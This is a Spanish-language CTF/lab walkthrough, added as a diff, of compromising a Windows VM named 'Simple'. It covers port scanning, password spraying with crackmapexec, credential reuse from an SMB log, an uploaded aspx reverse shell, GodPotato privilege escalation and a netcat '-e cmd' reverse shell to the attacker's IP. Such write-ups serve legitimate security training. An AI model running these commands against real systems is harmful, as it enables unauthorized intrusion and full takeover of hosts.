@@ -1,0 +1,245 @@
+Enumeramos puertos: 
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.16
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-22 16:37 -0400
+Nmap scan report for 192.168.1.16
+Host is up (0.00018s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49675/tcp open  unknown
+MAC Address: 08:00:27:CA:7C:75 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
+
+❯ nmap -sCV -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49675 -oN 02-targeted.txt 192.168.1.16
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-22 16:38 -0400
+Nmap scan report for 192.168.1.16
+Host is up (0.00098s latency).
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Simple
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ca:7c:75 (Oracle VirtualBox virtual NIC)
+| smb2-time: 
+|   date: 2025-07-22T20:39:49
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.58 seconds
+
+Entramos al sitio web, y nos encontramos con una nota de agradecimiento nombrando un par de empleados, por lo que los registramos en user.txt:
+❯ cat users.txt
+ruy
+marcos
+lander
+bogo
+vaiper
+
+Probamos los usuarios con los mismos nombres de usuarios como contraseña:
+❯ crackmapexec smb 192.168.1.16 -u users.txt -p users.txt
+...
+SMB         192.168.1.16    445    SIMPLE           [+] Simple\bogo:bogo
+...
+
+Nos conectamos con el usuario bogo y listamos los recursos compartidos:
+❯ smbclient -L //192.168.1.16/ -U bogo
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\bogo]: bogo
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Admin remota
+	C$              Disk      Recurso predeterminado
+	IPC$            IPC       IPC remota
+	LOGS            Disk      
+	WEB             Disk      
+SMB1 disabled -- no workgroup available
+
+Nos conectamos al recurso LOGS y listamos su contenido:
+❯ smbclient //192.168.1.16/LOGS -U bogo
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\bogo]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Oct  8 18:23:36 2023
+  ..                                  D        0  Sun Oct  8 18:23:36 2023
+  20231008.log                        A     2200  Sun Oct  8 18:23:36 2023
+
+		12966143 blocks of size 4096. 11126408 blocks available
+smb: \> ls
+  .                                   D        0  Sun Oct  8 18:23:36 2023
+  ..                                  D        0  Sun Oct  8 18:23:36 2023
+  20231008.log                        A     2200  Sun Oct  8 18:23:36 2023
+
+		12966143 blocks of size 4096. 11126408 blocks available
+
+Descargamos el log en nuestra maquina:
+smb: \> get 20231008.log 
+
+En la linea 32 del archivo, encontramos unas credenciales:
+❯ cat 20231008.log
+...
+PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
+...
+
+Probamos subir archivos sine exito:
+smb: \> put file.txt
+NT_STATUS_ACCESS_DENIED opening remote file \file.txt
+
+Probamos con el otro usuario:
+❯ smbclient //192.168.1.16/WEB -U marcos
+Password for [WORKGROUP\marcos]: SuperPassword
+smb: \> ls
+  .                                   D        0  Sun Oct  8 12:14:24 2023
+  ..                                  D        0  Sun Oct  8 12:14:24 2023
+  03-comming-soon                     D        0  Sun Oct  8 18:22:15 2023
+  aspnet_client                       D        0  Sun Oct  8 16:46:18 2023
+  common-js                           D        0  Sun Oct  8 18:14:09 2023
+  fonts                               D        0  Sun Oct  8 18:14:09 2023
+  images                              D        0  Sun Oct  8 18:14:09 2023
+  index.html                          A     1481  Sun Oct  8 18:26:47 2023
+
+		12966143 blocks of size 4096. 11126326 blocks available
+smb: \> put file.txt
+putting file file.txt as \file.txt (0,0 kb/s) (average 0,0 kb/s)
+smb: \>
+
+Subimos una reverse shell en aspx (https://jiveturkey.rocks/tactics/2021/09/21/asp-reverse-shell.html) (Version with dedicated ip and port):
+smb: \> put pwned.aspx
+putting file pwned.aspx as \pwned.aspx (5057,1 kb/s) (average 2167,4 kb/s)
+
+Corremos ncat en nuestra maquina e ingresamos a la reverse en la dirección http://192.168.1.16/pwned.aspx:
+❯ ncat -nlvp 1234
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.16:49672.
+Spawn Shell...
+Microsoft Windows [Versi�n 10.0.17763.107]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+c:\windows\system32\inetsrv> whoami
+iis apppool\defaultapppool
+
+Para escalar privilegios, transferimos netcat para windows (https://github.com/int0x33/nc.exe/) y godpotato (https://github.com/BeichenDream/GodPotato), a la máquina víctima con smclient:
+smb: \> put nc.exe
+putting file nc.exe as \nc.exe (6285,1 kb/s) (average 4067,9 kb/s)
+smb: \> put GodPotato-NET4.exe 
+putting file GodPotato-NET4.exe as \GodPotato-NET4.exe (11199,8 kb/s) (average 6049,0 kb/s)
+
+c:\inetpub\wwwroot>GodPotato-NET4.exe -cmd "cmd /c whoami"
+GodPotato-NET4.exe -cmd "cmd /c whoami"
+[*] CombaseModule: 0x140723670614016
+[*] DispatchTable: 0x140723672931568
+[*] UseProtseqFunction: 0x140723672306848
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\882f77e7-9c29-42b3-ab96-5253d02f311b\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00006002-0364-ffff-225a-d6a670dd9421
+[*] DCOM obj OXID: 0xbcb5dc919c9df913
+[*] DCOM obj OID: 0xc3c177bbf2d03735
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\Servicio de red
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 748 Token:0x840  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2032
+
+nt authority\system
+
+Tuvimos exito con GodPotato-NET4, por lo que ahora ejecutamos nc como nt authority\system, para obtener una shell:
+❯ ncat -nlvp 4321
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4321
+Ncat: Listening on 0.0.0.0:4321
+
+c:\inetpub\wwwroot>GodPotato-NET4.exe -cmd "./nc.exe -e cmd 192.168.1.5 4321"
+GodPotato-NET4.exe -cmd "./nc.exe -e cmd 192.168.1.5 4321"
+[*] CombaseModule: 0x140723670614016
+[*] DispatchTable: 0x140723672931568
+[*] UseProtseqFunction: 0x140723672306848
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\88914ed0-135c-4832-a14e-be62e5fa9b14\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000bc02-071c-ffff-e187-00f8b2a6e60c
+[*] DCOM obj OXID: 0xfbd59a5fb3605e07
+[*] DCOM obj OID: 0x34c9449c7010798f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\Servicio de red
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 748 Token:0x840  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 520
+
+❯ rlwrap ncat -nlvp 4321
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4321
+Ncat: Listening on 0.0.0.0:4321
+Ncat: Connection from 192.168.1.16:49684.
+Microsoft Windows [Versi�n 10.0.17763.107]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+c:\inetpub\wwwroot>whoami
+nt authority\system
+
+Ingresamos a c:\Users\marcos\Desktop y encontramos la flag de user.
+
+Ingresamos a c:\Users\Administrador\Desktop y encontramos la flag de root.
+
+Fin.
+
